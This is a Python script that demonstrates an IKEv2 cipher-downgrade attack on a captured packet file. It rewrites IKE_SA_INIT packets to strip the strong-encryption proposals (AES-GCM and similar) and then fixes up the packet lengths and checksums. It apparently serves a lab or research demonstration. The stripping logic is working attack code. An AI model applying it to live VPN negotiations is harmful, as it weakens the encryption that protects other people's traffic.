"""Downgrade attack, demonstrated on a captured pcap (no live MITM needed)."""
import sys, struct
from scapy.all import rdpcap, wrpcap, UDP, Raw, IP

EXCHANGE_IKE_SA_INIT = 34
PAYLOAD_SA = 33
STRONG_ENCR_IDS = {20, 18, 12}

def _walk(sa_body):
    off, out = 0, []
    while off + 8 <= len(sa_body):
        nxt, _r, length, num, proto, spisz, ntr = struct.unpack("!BBHBBBB", sa_body[off:off+8])
        end = off + length
        toff, encr = off + 8 + spisz, []
        while toff < end and toff + 8 <= len(sa_body):
            tn, _tr, tl, tt, _t2, tid = struct.unpack("!BBHBBH", sa_body[toff:toff+8])
            if tt == 1: encr.append(tid)
            if tl <= 0: break
            toff += tl
        out.append({"start": off, "end": end, "encr": encr})
        if length <= 0: break
        off = end
    return out

def _strip(sa_payload):
    gnext, gflags, glen = struct.unpack("!BBH", sa_payload[:4])
    body = sa_payload[4:]
    props = _walk(body)
    keep = [p for p in props if not (set(p["encr"]) & STRONG_ENCR_IDS)]
    if not keep or len(keep) == len(props):
        return sa_payload, False, props
    nb = bytearray()
    for i, p in enumerate(keep):
        chunk = bytearray(body[p["start"]:p["end"]])
        chunk[0] = 0 if i == len(keep)-1 else 2
        nb += chunk
    return struct.pack("!BBH", gnext, gflags, 4+len(nb)) + bytes(nb), True, props

def _downgrade_ike(raw):
    if len(raw) < 28: return raw, False
    _si,_sr,nextp,_v,exch,_f,_m,length = struct.unpack("!8s8sBBBBII", raw[:28])
    if exch != EXCHANGE_IKE_SA_INIT or nextp != PAYLOAD_SA:
        return raw, False
    body = raw[28:]
    gnext,gflags,salen = struct.unpack("!BBH", body[:4])
    sa, rest = body[:salen], body[salen:]
    newsa, changed, _ = _strip(sa)
    if not changed: return raw, False
    nb = newsa + rest
    return raw[:24] + struct.pack("!I", 28+len(nb)) + nb, True

def main(inp, outp):
    pkts = rdpcap(inp)
    n_changed = 0
    for p in pkts:
        if UDP in p and (p[UDP].dport in (500, 4500) or p[UDP].sport in (500, 4500)):
            payload = bytes(p[UDP].payload)
            if len(payload) < 28:
                continue
            prefix = b""
            ike = payload
            if payload[:4] == b"\x00\x00\x00\x00":
                prefix, ike = payload[:4], payload[4:]
            new_ike, changed = _downgrade_ike(ike)
            if changed:
                p[UDP].remove_payload()
                p[UDP].add_payload(Raw(prefix + new_ike))
                del p[UDP].len; del p[UDP].chksum
                if IP in p:
                    del p[IP].len; del p[IP].chksum
                n_changed += 1
    wrpcap(outp, pkts)
    print(f"[downgrade] rewrote {n_changed} IKE_SA_INIT packet(s) -> {outp}")
    if n_changed == 0:
        print("[downgrade] WARNING: no strong proposal found to strip. "
              "Is this a GCM capture with a multi-proposal IKE_SA_INIT?")
    return n_changed

ENCR_NAMES = {3:"3DES", 11:"NULL", 12:"AES-CBC", 13:"AES-CTR",
              14:"AES-CCM-8", 15:"AES-CCM-12", 16:"AES-CCM-16",
              18:"AES-GCM-8", 19:"AES-GCM-12", 20:"AES-GCM-16",
              23:"Camellia-CBC", 28:"ChaCha20-Poly1305"}
STRONG_NAMES = {"AES-GCM-8","AES-GCM-12","AES-GCM-16","ChaCha20-Poly1305"}

def first_proposal_cipher(pcap_path):
    from scapy.all import rdpcap, UDP
    for p in rdpcap(pcap_path):
        if UDP not in p or (p[UDP].dport not in (500,4500) and p[UDP].sport not in (500,4500)):
            continue
        payload = bytes(p[UDP].payload)
        if len(payload) < 28: continue
        if payload[:4] == b"\x00\x00\x00\x00": payload = payload[4:]
        if len(payload) < 28: continue
        _si,_sr,nextp,_v,exch,_f,_m,_l = struct.unpack("!8s8sBBBBII", payload[:28])
        if exch != EXCHANGE_IKE_SA_INIT or nextp != PAYLOAD_SA: continue
        body = payload[28:]
        gnext,gflags,salen = struct.unpack("!BBH", body[:4])
        props = _walk(body[4:salen])
        if not props: continue
        encr_ids = props[0]["encr"]
        if not encr_ids: continue
        name = ENCR_NAMES.get(encr_ids[0], f"id{encr_ids[0]}")
        return name, (name in STRONG_NAMES)
    return None, False

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("usage: python3 downgrade_pcap.py <input.pcap> <output.pcap>"); sys.exit(1)
    main(sys.argv[1], sys.argv[2])
